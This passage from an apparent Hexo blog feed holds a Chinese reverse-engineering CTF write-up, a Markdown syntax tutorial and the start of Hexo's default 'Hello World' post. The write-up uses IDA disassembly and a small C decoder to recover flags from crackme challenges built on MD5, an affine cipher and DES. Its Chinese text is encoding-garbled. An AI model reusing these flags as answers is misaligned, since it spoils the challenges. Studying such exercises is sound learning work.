class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> a[] = <span class="string">&quot;\\eluxfqvF|Puzzce&quot;</span>;</span><br><span class="line">   <span class="type">char</span> b,c,d;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">15</span>;i++)&#123;</span><br><span class="line">   b = a[i] &amp; <span class="number">240</span>;</span><br><span class="line">    c = (a[i] &amp; <span class="number">12</span>)&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    d = (a[i] &amp; <span class="number">3</span>)&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    a[i] = b | c | d;</span><br><span class="line">    </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ±‚è§£å¾—åˆ°ç»“æœ<code>SecurityIsPuzzle</code>ï¼Œåœ¨è¯¥å­—ç¬¦ä¸²åä»»æ„æ·»åŠ ä¸¤ä¸ªå­—ç¬¦å³ä¸ºflagã€‚<br><img src="2022-07-15%20190714.jpg" alt="res"></p><h2 id="cpp-3">cpp.3</h2><p>ä½¿ç”¨IDAè¿›è¡Œåˆ†æï¼Œåœ¨åªè¯»æ•°æ®æ®µå‘ç°å¦‚ä¸‹æ•°æ®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0042805C dword_42805C    dd 0D76AA478h</span><br><span class="line">.rdata:00428060 dword_428060    dd 0E8C7B756h</span><br><span class="line">.rdata:00428064 dword_428064    dd 242070DBh</span><br><span class="line">.rdata:00428068 dword_428068    dd 0C1BDCEEEh</span><br><span class="line">.rdata:0042806C dword_42806C    dd 0F57C0FAFh</span><br><span class="line">.rdata:00428070 dword_428070    dd 4787C62Ah</span><br><span class="line">.rdata:00428074 dword_428074    dd 0A8304613h</span><br></pre></td></tr></table></figure><p>ä¸€çœ¼MD5ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_430]</span><br><span class="line">movsx   eax, [ebp+edx+var_424]</span><br><span class="line">cmp     eax, 61h</span><br><span class="line">jl      short loc_401195</span><br><span class="line">mov     ecx, [ebp+var_430]</span><br><span class="line">movsx   edx, [ebp+ecx+var_424]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jle     short loc_4011AA</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥èŒƒå›´åœ¨a-zã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_434], 5    ;var_434ä¸­å­˜å‚¨äº†è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦</span><br><span class="line">jnb     short loc_4011C4</span><br></pre></td></tr></table></figure><p>è¦æ±‚è¾“å…¥é•¿åº¦ä¸º5ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">push    4</span><br><span class="line">lea     eax, [ebp+var_424]          ;var_42Cä¸­å­˜å‚¨è¾“å…¥çš„å­—ç¬¦ä¸²</span><br><span class="line">push    eax             ; char *</span><br><span class="line">lea     ecx, [ebp+var_42C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">push    4               ; int</span><br><span class="line">lea     edx, [ebp+var_42C]</span><br><span class="line">push    edx             ; int</span><br><span class="line">lea     eax, [ebp+var_24]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    sub_401014</span><br></pre></td></tr></table></figure><p>æ˜¯å°†è¾“å…¥ä¸²çš„å‰å››ä¸ªå­—èŠ‚è¿›è¡Œå¤„ç†ï¼Œsub_401014ä¸ºåŠ å¯†å‡½æ•°ã€‚<br>åŠ å¯†åçš„å­—ç¬¦ä¸²ä¸&quot;b5c0b187fe309af0f4d35982fd961d7e&quot;è¿›è¡Œæ¯”è¾ƒã€‚<br>æˆ‘ä»¬ä½¿ç”¨è„šæœ¬å¯¹è¯¥å­—ç¬¦ä¸²è¿›è¡Œæ±‚è§£ï¼Œå¾—åˆ°å¯¹åº”çš„æ˜æ–‡ä¸º<code>love</code>ï¼Œéœ€è¦åœ¨åé¢æ·»åŠ ä»»æ„ä¸€ä¸ªå°å†™å­—æ¯ã€‚<br><img src="2022-07-15%20200510.jpg" alt="res"></p><h2 id="cpp-4">cpp.4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_7C]</span><br><span class="line">movsx   edx, [ebp+ecx+var_70]</span><br><span class="line">cmp     edx, 41h</span><br><span class="line">jl      short loc_4010B7</span><br><span class="line">mov     eax, [ebp+var_7C]</span><br><span class="line">movsx   ecx, [ebp+eax+var_70]</span><br><span class="line">cmp     ecx, 5Ah</span><br><span class="line">jle     short loc_4010CC</span><br></pre></td></tr></table></figure><p>å¯çŸ¥è¾“å…¥çš„å­—ç¬¦ä¸²è¦æ±‚å…¨ä¸ºå¤§å†™å­—æ¯ï¼Œå³A-Zã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_7C]</span><br><span class="line">movsx   edx, [ebp+ecx+var_70]</span><br><span class="line">sub     edx, 41h</span><br><span class="line">mov     [ebp+var_74], edx</span><br><span class="line">mov     eax, [ebp+var_74]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_74], edx</span><br><span class="line">mov     edx, [ebp+var_74]</span><br><span class="line">add     edx, 41h</span><br><span class="line">mov     eax, [ebp+var_7C]</span><br><span class="line">mov     [ebp+eax+var_70], dl</span><br><span class="line">jmp     short loc_4010D7</span><br></pre></td></tr></table></figure><p>ç”±ä¸Šè¿°å¤„ç†è¿‡ç¨‹å¯çŸ¥ï¼Œå°†è¾“å…¥å­—ç¬¦ä¸²æ¯ä¸€å­—èŠ‚å‡å»0x41åä¸var_4è¿›è¡Œç›¸ä¹˜ï¼Œå†ä¸var_8è¿›è¡Œç›¸åŠ ï¼Œå†ä¸26ï¼ˆ0x1Aï¼‰è¿›è¡Œç›¸é™¤ï¼Œå–ä½™ï¼ˆidivå‘½ä»¤ä¸­æ‰€å¾—ç»“æœå­˜åœ¨eaxä¸­ï¼Œä½™æ•°å­˜äºedxä¸­ï¼‰ï¼Œä¸€çœ¼ä»¿å°„åŠ å¯†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     [ebp+var_4], 9</span><br><span class="line">mov     [ebp+var_8], 7</span><br></pre></td></tr></table></figure><p>åŠ å¯†æ‰€å¾—ç»“æœä¸&quot;SHUJDU&quot;è¿›è¡Œæ¯”è¾ƒã€‚9æ¨¡26çš„é€†å…ƒä¸º3ã€‚æ±‚å¾—flagä¸º<code>HANGON</code>ã€‚</p><h2 id="cpp-5">cpp.5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_20]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_20]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">cmp     eax, 8</span><br><span class="line">jz      short loc_40111D</span><br></pre></td></tr></table></figure><p>è¦æ±‚æ˜æ–‡é•¿åº¦ä¸º8å­—èŠ‚ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004280CC byte_4280CC     db  10h</span><br><span class="line">.rdata:004280CD                 db    7</span><br><span class="line">.rdata:004280CE                 db  14h</span><br><span class="line">.rdata:004280CF                 db  15h</span><br><span class="line">.rdata:004280D0                 db  1Dh</span><br><span class="line">.rdata:004280D1                 db  0Ch</span><br><span class="line">.rdata:004280D2                 db  1Ch</span><br><span class="line">.rdata:004280D3                 db  11h</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_24]</span><br><span class="line">movsx   ecx, ds:byte_4280CC[eax]</span><br><span class="line">mov     edx, [ebp+arg_4]</span><br><span class="line">add     edx, [ebp+var_24]</span><br><span class="line">mov     al, byte ptr [ebp+ecx+var_24+3]</span><br><span class="line">mov     [edx], al</span><br><span class="line">jmp     short loc_4018D3</span><br></pre></td></tr></table></figure><p>ç”±ä¸Šå¯çŸ¥ï¼Œè¿™æ˜¯DESç®—æ³•çš„Pç½®æ¢ï¼Œè¯¥ç®—æ³•ä¸ºDESã€‚ä¹Ÿå¯ä»¥æ ¹æ®<code>sub_401C10</code>å‡½æ•°å¾—åˆ°è¯¥å‡½æ•°æ˜¯DESè½®å¯†é’¥çš„äº§ç”Ÿè¿‡ç¨‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DESçš„åˆå§‹å¯†é’¥ä¸º0x54,0x61,0x6B,0x65,0x45,0x61,0x73,0x79</span><br><span class="line">åŠ å¯†æ‰€å¾—çš„å¯†æ–‡åº”è¯¥æ˜¯0x28,0x70,0x77,0x48,0x7B,0x4F,0xFF,0x3D</span><br></pre></td></tr></table></figure><p>æ±‚å¾—flagä¸º<code>itiseasy</code>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkdownåŸºæœ¬ç”¨æ³•</title>
      <link href="/2022/07/b/"/>
      <url>/2022/07/b/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¼–è¾‘å·¥å…·">ç¼–è¾‘å·¥å…·</h2><h3 id="Typora">Typora</h3><p>å¥½ç”¨ï¼Œç›®å‰æ”¶è´¹ï¼Œä½†å¯ä»¥ç™½å«–ï¼ˆä¹ï¼‰ï¼Œå…·ä½“ä¸‹è½½åœ°å€è¯·è‡ªè¡Œç™¾åº¦ã€‚è¿˜æ˜¯æ¨èå¤§å®¶æ”¯æŒæ­£ç‰ˆï¼ˆå ç”²ï¼‰ã€‚</p><h3 id="Visual-Studio-Code">Visual Studio Code</h3><p><s>ç›®å‰åœ¨ç”¨</s>ï¼Œéœ€è¦ä¸‹è½½æ’ä»¶ï¼š</p><ul><li>Markdown All in One</li><li>Markdown Preview Enhanced</li></ul><h3 id="Obsdian">Obsdian</h3><p>ç”¨èµ·æ¥æ¯”è¾ƒèˆ’æœã€‚ä¹Ÿæ˜¯å¸¸ç”¨å·¥å…·</p><blockquote><p>ä¸æ­¢äºMarkdownï¼Œåç»­åº”è¯¥ä¼šå¼€ä¸ªå‘è¯´è¯´è¿™ä¸ªå·¥å…·ï¼ˆåº”è¯¥ï¼Œå’•å’•å’•ï¼‰</p></blockquote><h3 id="Notion">Notion</h3><p>åŸç”Ÿæ”¯æŒMarkdownï¼Œç•Œé¢å¾ˆç®€æ´ã€‚ä¸”æ‹¥æœ‰å¾ˆå¤šå¼ºå¤§çš„æ¨¡æ¿å’ŒåŠŸèƒ½<br>ç¼ºç‚¹ï¼š</p><ul><li>å› ä¸ºæ˜¯ä¸Šäº‘çš„ï¼Œä¸”æœåŠ¡å™¨åœ¨å›½å¤–ï¼Œæ‰€ä»¥æ‰“å¼€æ¯”è¾ƒæ…¢ï¼ˆè™½ç„¶æˆ‘è§‰å¾—é€Ÿåº¦è¿˜æ˜¯å¯ä»¥æ¥å—ï¼‰</li><li>æ•°æ®å¯èƒ½ä¼šä¸¢å¤± <s>(å¤‡ä»½ä¸€ä¸‹å°±å¥½äº†)</s></li></ul><blockquote><p>å¾ˆé‡è¦ï¼Œä¸€å®šè¦å¤‡ä»½ã€‚ä¸€æ˜¯äº‘ä¸Šæ•°æ®ç¡®å®æœ‰ä¸¢å¤±é£é™©ï¼ŒäºŒæ˜¯notionç›®å‰å·²ç»ç¦æ­¢äº†åœ¨ä¿„ç½—æ–¯å¢ƒå†…çš„æœåŠ¡ï¼Œä¹Ÿè®¸æœ‰ä¸€å¤©æˆ‘ä»¬ä¹Ÿç”¨ä¸äº†ï¼ˆå¸Œæœ›è¿™ä¸€å¤©ä¸ä¼šåˆ°æ¥ï¼Œä¸è¿‡å±€åŠ¿å¦‚æ­¤ï¼Œæœ‰æ—¶å€™ä¹Ÿæ˜¯æ²¡åŠæ³•çš„äº‹ï¼‰ã€‚è®°ä½ä¸€ç‚¹ï¼ŒæŠŠé¸¡è›‹æ”¾åœ¨ä¸€ä¸ªç¯®å­é‡Œæ˜¯ä¸æ˜æ™ºçš„ã€‚</p></blockquote><blockquote><p>TODO-List: å› ä¸ºæœ€è¿‘ç»„é‡Œè¦æ±‚ä½¿ç”¨è¿™ä¸ªå·¥å…·ï¼Œåç»­å¯èƒ½ä¼šå­¦ä¹ ä¸€ä¸‹è¿™ä¸ªå·¥å…·çš„ä½¿ç”¨ï¼ˆå’•å’•å’•ï¼‰</p></blockquote><h2 id="åŸºæœ¬è¯­æ³•">åŸºæœ¬è¯­æ³•</h2><p>åŸºæœ¬è¯­æ³•ä½¿ç”¨å‡ æ¬¡å°±ä¼šäº†ï¼Œè™½ç„¶æœ‰å­¦ä¹ æˆæœ¬ï¼Œä½†æ€»ä½“æ¥è¯´æ¯”è¾ƒå®¹æ˜“ã€‚</p><h3 id="æ ‡é¢˜">æ ‡é¢˜</h3><p>ä½¿ç”¨<code>#</code>è¡¨ç¤º1-6çº§æ ‡é¢˜<br>ä¸è¦å¿˜äº†åŠ ç©ºæ ¼ï¼ŒååŒã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># ä¸€çº§æ ‡é¢˜</span></span><br><span class="line"><span class="section">## äºŒçº§æ ‡é¢˜</span></span><br><span class="line"><span class="section">### ä¸‰çº§æ ‡é¢˜</span></span><br><span class="line"><span class="section">#### å››çº§æ ‡é¢˜</span></span><br><span class="line"><span class="section">##### äº”çº§æ ‡é¢˜</span></span><br><span class="line"><span class="section">###### å…­çº§æ ‡é¢˜</span></span><br></pre></td></tr></table></figure><h3 id="åŒºå—">åŒºå—</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; è¿™æ˜¯ä¸€ä¸ªåŒºå—</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœ</p><blockquote><p>è¿™æ˜¯ä¸€ä¸ªåŒºå—</p></blockquote><p>ä¹Ÿå¯ä»¥åµŒå¥—</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; ç¬¬ä¸€å±‚</span></span><br><span class="line"><span class="quote">&gt; &gt; ç¬¬äºŒå±‚</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœ</p><blockquote><p>ç¬¬ä¸€å±‚</p><blockquote><p>ç¬¬äºŒå±‚</p></blockquote></blockquote><h3 id="åˆ—è¡¨">åˆ—è¡¨</h3><p>å¯ä»¥ä½¿ç”¨åºå·æˆ–<code>-</code>è¡¨ç¤ºåˆ—è¡¨</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 1</span><br><span class="line"><span class="bullet">2.</span> 2</span><br><span class="line"><span class="bullet">3.</span> 3</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 1</span><br><span class="line"><span class="bullet">-</span> 2</span><br><span class="line"><span class="bullet">-</span> 3</span><br></pre></td></tr></table></figure><p>æ•ˆæœ</p><ol><li>1</li><li>2</li><li>3</li></ol><ul><li>1</li><li>2</li><li>3</li></ul><h3 id="ä»£ç å—">ä»£ç å—</h3><p>ä»£ç åŒºå—å¯ä»¥ä½¿ç”¨<code>```</code>å°†å…¶åŒ…è£¹èµ·æ¥</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="code">```c</span></span><br><span class="line"><span class="code">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="code">int main()&#123;</span></span><br><span class="line"><span class="code">    printf(&quot;Hello World\n&quot;);</span></span><br><span class="line"><span class="code">    return 0;</span></span><br><span class="line"><span class="code">&#125;```</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¡Œå†…ä»£ç å—å¯ä»¥ä½¿ç”¨`åŒ…è£¹<br>å¦‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">`printf`</span></span><br></pre></td></tr></table></figure><p>æ•ˆæœ<br><code>printf</code></p><h3 id="æ•°å­¦å…¬å¼">æ•°å­¦å…¬å¼</h3><p>è¡Œå†…ä½¿ç”¨<code>$</code>ï¼Œå…¬å¼å—ä½¿ç”¨<code>$$</code>ï¼ŒMarkdownä¸€èˆ¬ä½¿ç”¨KaTexæˆ–MathJaxè¿›è¡Œæ¸²æŸ“ï¼Œå…·ä½“çš„è¯­æ³•è¯·è‡ªè¡ŒæŸ¥é˜…ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\frac&#123;\partial f&#125;&#123;\partial x&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>æ•ˆæœ</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>f</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><mi>x</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial f}{\partial x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="è¡¨æ ¼">è¡¨æ ¼</h3><p>ä½¿ç”¨<code>|</code>æ¥åˆ†éš”ä¸åŒçš„å•å…ƒæ ¼ï¼Œä½¿ç”¨<code>-</code>æ¥åˆ†å‰²è¡¨å¤´ä¸è¡¨é¡¹ã€‚</p><p>å†’å·åœ¨å·¦è¾¹è¡¨ç¤ºå·¦å¯¹é½ï¼Œå³è¾¹ä¸ºå³å¯¹é½ï¼Œä¸¤è¾¹éƒ½æœ‰ä¸ºä¸­é—´å¯¹é½ã€‚</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|a|b|c</span><br><span class="line">|:---|---:|:---:|</span><br><span class="line">|ABC|1|2|</span><br><span class="line">|abc|0|1|</span><br></pre></td></tr></table></figure><p>æ•ˆæœ</p><table><thead><tr><th style="text-align:left">a</th><th style="text-align:right">b</th><th style="text-align:center">c</th></tr></thead><tbody><tr><td style="text-align:left">ABC</td><td style="text-align:right">1</td><td style="text-align:center">2</td></tr><tr><td style="text-align:left">abc</td><td style="text-align:right">0</td><td style="text-align:center">1</td></tr></tbody></table><h3 id="åˆ†å‰²çº¿">åˆ†å‰²çº¿</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---</span><br></pre></td></tr></table></figure><p>æ•ˆæœ</p><hr><h3 id="é“¾æ¥">é“¾æ¥</h3><p>ä½¿ç”¨æ–¹å¼</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">é“¾æ¥åç§°</span>](<span class="link">é“¾æ¥åœ°å€</span>)</span><br></pre></td></tr></table></figure><p>æ•ˆæœ<br><a href="www.baidu.com">ç™¾åº¦</a></p><h3 id="ä¸€äº›å…¶ä»–ç”¨æ³•">ä¸€äº›å…¶ä»–ç”¨æ³•</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*æ–œä½“æ–‡æœ¬*</span></span><br><span class="line"><span class="strong">**ç²—ä½“æ–‡æœ¬**</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*ç²—æ–œä½“æ–‡æœ¬*</span>**</span></span><br><span class="line">~~åˆ é™¤çº¿~~</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>å¸¦ä¸‹åˆ’çº¿æ–‡æœ¬<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line">2<span class="language-xml"><span class="tag">&lt;<span class="name">sup</span>&gt;</span></span>10<span class="language-xml"><span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span></span><br><span class="line">H<span class="language-xml"><span class="tag">&lt;<span class="name">sub</span>&gt;</span></span>2<span class="language-xml"><span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span>O</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ä¸Šä¸‹æ ‡å’Œä¸‹åˆ’çº¿ä½¿ç”¨çš„æ˜¯åµŒå…¥çš„htmlè¯­å¥ã€‚<br>æ•ˆæœ<br><em>æ–œä½“æ–‡æœ¬</em><br><strong>ç²—ä½“æ–‡æœ¬</strong><br><em><strong>ç²—æ–œä½“æ–‡æœ¬</strong></em><br><s>åˆ é™¤çº¿</s><br><u>å¸¦ä¸‹åˆ’çº¿æ–‡æœ¬</u></p><p>2<sup>10</sup><br>H<sub>2</sub>O</p><h3 id="åµŒå…¥html-cssæˆ–javascript">åµŒå…¥html,cssæˆ–javascript</h3><p>Markdownæ”¯æŒåµŒå…¥html,cssæˆ–javascriptã€‚</p><h3 id="è½¬ä¹‰">è½¬ä¹‰</h3><p>Markdownä½¿ç”¨äº†å¾ˆå¤šç‰¹æ®Šç¬¦å·æ¥è¡¨ç¤ºç‰¹å®šçš„æ„ä¹‰ï¼Œå¦‚æœéœ€è¦æ˜¾ç¤ºç‰¹å®šçš„ç¬¦å·åˆ™éœ€è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦ï¼ŒMarkdownä½¿ç”¨åæ–œæ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ã€‚<br>Markdownæ”¯æŒä»¥ä¸‹è¿™äº›ç¬¦å·å‰é¢åŠ ä¸Šåæ–œæ ä»¥è¡¨ç¤ºæ’å…¥æ™®é€šçš„ç¬¦å·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   åæ–œçº¿</span><br><span class="line">`   åå¼•å·</span><br><span class="line">*   æ˜Ÿå·</span><br><span class="line">_   ä¸‹åˆ’çº¿</span><br><span class="line">&#123;&#125;  èŠ±æ‹¬å·</span><br><span class="line">[]  æ–¹æ‹¬å·</span><br><span class="line">()  å°æ‹¬å·</span><br><span class="line">#   äº•å­—å·</span><br><span class="line">+   åŠ å·</span><br><span class="line">-   å‡å·</span><br><span class="line">.   è‹±æ–‡å¥ç‚¹</span><br><span class="line">!   æ„Ÿå¹å·</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åšå®¢æ’°å†™ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> åšå®¢æ’°å†™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/hello-world/"/>
      <url>/2022/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight 